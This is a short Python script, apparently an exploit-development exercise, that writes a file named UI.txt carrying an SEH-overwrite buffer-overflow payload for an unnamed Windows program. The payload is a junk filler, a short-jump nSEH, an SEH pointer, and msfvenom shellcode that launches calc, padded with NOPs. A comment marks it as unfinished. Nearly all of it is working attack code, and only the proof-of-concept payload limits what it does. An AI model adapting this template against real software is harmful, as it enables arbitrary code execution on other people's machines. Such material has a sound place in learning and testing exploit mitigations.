#needs work, redo later, bad chars didn't make sense

filename = "UI.txt"

#msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x20\x0a\x0d\xa2\xf7"  EXITFUNC=seh
#seh overwrite should be 0x10018de8
#nseh should be \xeb\x06\x90\x90
junk = "A"*584
seh = "\xe8\x8d\x01\x10"
#nseh = "\xcc\xcc\xcc\xcc"
nseh = "\xeb\x06\x90\x90"
nops = "\x90" * 25
buf =  ""
buf += "\xdd\xc4\xd9\x74\x24\xf4\x58\xba\x0c\x44\xb0\x11\x29"
buf += "\xc9\xb1\x30\x31\x50\x18\x83\xc0\x04\x03\x50\x18\xa6"
buf += "\x45\xed\xc8\xa4\xa6\x0e\x08\xc9\x2f\xeb\x39\xc9\x54"
buf += "\x7f\x69\xf9\x1f\x2d\x85\x72\x4d\xc6\x1e\xf6\x5a\xe9"
buf += "\x97\xbd\xbc\xc4\x28\xed\xfd\x47\xaa\xec\xd1\xa7\x93"
buf += "\x3e\x24\xa9\xd4\x23\xc5\xfb\x8d\x28\x78\xec\xba\x65"
buf += "\x41\x87\xf0\x68\xc1\x74\x40\x8a\xe0\x2a\xdb\xd5\x22"
buf += "\xcc\x08\x6e\x6b\xd6\x4d\x4b\x25\x6d\xa5\x27\xb4\xa7"
buf += "\xf4\xc8\x1b\x86\x39\x3b\x65\xce\xfd\xa4\x10\x26\xfe"
buf += "\x59\x23\xfd\x7d\x86\xa6\xe6\x25\x4d\x10\xc3\xd4\x82"
buf += "\xc7\x80\xda\x6f\x83\xcf\xfe\x6e\x40\x64\xfa\xfb\x67"
buf += "\xab\x8b\xb8\x43\x6f\xd0\x1b\xed\x36\xbc\xca\x12\x28"
buf += "\x1f\xb2\xb6\x22\x8d\xa7\xca\x68\xdb\x36\x58\x17\xa9"
buf += "\x39\x62\x18\x9d\x51\x53\x93\x72\x25\x6c\x76\x37\xd7"
buf += "\x9d\x4b\xad\x40\x04\x3e\x8c\x0c\xb7\x94\xd2\x28\x34"
buf += "\x1d\xaa\xce\x24\x54\xaf\x8b\xe2\x84\xdd\x84\x86\xaa"
buf += "\x72\xa4\x82\xc8\x15\x36\x4e\x0f"

stuff = "\x90" * (3000 - (len(junk) + len(nseh) + len(seh) + len(buf)))

attack_string = junk + nseh + seh + buf + stuff

file = open(filename,"w")
file.write(attack_string)
file.close
